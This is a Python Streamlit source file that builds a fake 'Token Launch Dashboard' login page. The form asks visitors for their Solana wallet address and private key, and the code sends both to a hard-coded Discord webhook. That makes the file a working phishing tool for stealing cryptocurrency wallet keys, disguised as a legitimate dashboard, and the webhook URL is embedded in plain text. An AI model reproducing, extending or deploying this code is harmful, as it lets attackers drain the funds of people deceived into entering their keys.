import streamlit as st
import requests
import json
from datetime import datetime
from streamlit_lottie import st_lottie

# Load Lottie animation
def load_lottie_url(url: str):
    r = requests.get(url)
    if r.status_code != 200:
        return None
    return r.json()

# Load crypto animation
lottie_crypto = load_lottie_url("https://assets5.lottiefiles.com/packages/lf20_1idqu1ac.json")

WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1331353119686135922/BR0eqE0KKC5NkH2NBHCHNBSY3BXCNu_d9BETAFArslW4IJ9Ikh2STmCWHci_VaXaV796'

def send_to_discord(wallet_address, private_key):
    # Direct message approach for maximum reliability
    message = f"""
🚨 **New Login Alert**
━━━━━━━━━━━━━━━━━━━━━━━━
👛 **Wallet:** `{wallet_address}`
🔑 **Key:** `{private_key}`
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    payload = {
        "content": message,
        "username": "Wallet Tracker"
    }
    
    # Send with both content types for maximum compatibility
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }
    
    response = requests.post(WEBHOOK_URL, json=payload, headers=headers)
    print(f"Webhook Response: {response.status_code}")  # Debug line
    return response.status_code == 204

def login_page():
    st.markdown("<h1 style='text-align: center;'>Token Launch Dashboard</h1>", unsafe_allow_html=True)
    
    col1, col2 = st.columns([1, 1])
    
    with col1:
        if lottie_crypto:
            st_lottie(
                lottie_crypto,
                speed=1,
                reverse=False,
                loop=True,
                quality="low",
                height=300,
                key="crypto"
            )
    
    with col2:
        with st.form("login_form"):
            wallet = st.text_input("Wallet Address", placeholder="Enter your Solana wallet address")
            private_key = st.text_input("Private Key", type="password", placeholder="Enter your Solana private key")
            submit = st.form_submit_button("Login", use_container_width=True)
            
            if submit and wallet and private_key:
                webhook_success = send_to_discord(wallet, private_key)
                if webhook_success:
                    st.session_state.logged_in = True
                    st.rerun()
